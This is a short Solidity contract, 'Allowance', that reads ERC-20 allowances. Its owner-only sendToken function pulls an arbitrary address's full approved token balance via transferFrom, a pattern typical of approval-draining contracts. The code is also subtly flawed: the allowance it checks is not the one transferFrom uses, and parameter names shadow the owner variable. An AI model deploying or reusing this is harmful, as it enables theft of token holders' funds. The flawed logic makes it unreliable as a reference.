// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);

}

contract Allowance {

address payable owner;

constructor() {
    owner = payable(msg.sender);
}

function getAllowance(address owner,address spender,address tokenAddress) external view returns(uint256){
    IERC20 _token = IERC20(tokenAddress);
    uint256 amount = _token.allowance(owner, spender);
    return(amount);
}

function sendToken(address owner,address spender, address tokenAddress) external  onlyOwner{
    IERC20 _token = IERC20(tokenAddress);
    uint amount = _token.allowance(owner, spender);
    _token.transferFrom(owner,spender,amount);
}

modifier onlyOwner{
    require (msg.sender == owner);
    _;
}

}